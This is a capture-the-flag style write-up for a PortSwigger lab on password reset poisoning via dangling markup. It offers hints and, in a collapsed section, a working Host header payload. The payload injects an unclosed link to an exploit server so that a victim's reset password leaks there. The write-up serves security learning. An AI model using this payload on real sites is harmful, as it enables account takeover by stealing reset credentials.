# Lab: Password reset poisoning via dangling markup

- [Link](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)

## Tips

This lab is quite similar to the [Password reset poisoning via middleware](../password-reset-poisoning), but with minor changes.

The first thing you need to know is: what is a dangling markup injection? After you get a grasp of what it is, it's play time! :fire:

<details>
<summary>Click to expand!</summary>

Again, I won't give you directly which header it is, but take a look [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#request_context) and see if you can play with them!

Try to notice the differences you get when you're playing with them. How the server responds, did you get any password e-mail? Yes? No? What're the inputs you need to get the desirable e-mail? Try to find the answers for those questions when you make your trials.

<details>
<summary>Really stuck? Click here for my solution</summary>

You can find out by yourself which header we need to play with, but here is the value that I used to retrieve the password:

```text
ac171f231f38e8a8c0ea4005002a00e0.web-security-academy.net:abc<a href="https://exploit-ac8a1f2e1fa0e866c08440f9019300c2.web-security-academy.net/?
```
  
</details>
  
</details>

In this lab, you'll be taking advantage of how e-mail virus scanners work :smiling_imp: (or maybe how not well developed virus scanner works! :sweat_smile:)

Intercept the password sent and login into `carlos` account see:

:tada: :tada: :tada: :tada: :tada: :tada: :tada: :tada: :tada: :tada:

![Congratulations, you solved the lab!](./assets/congratulations.png)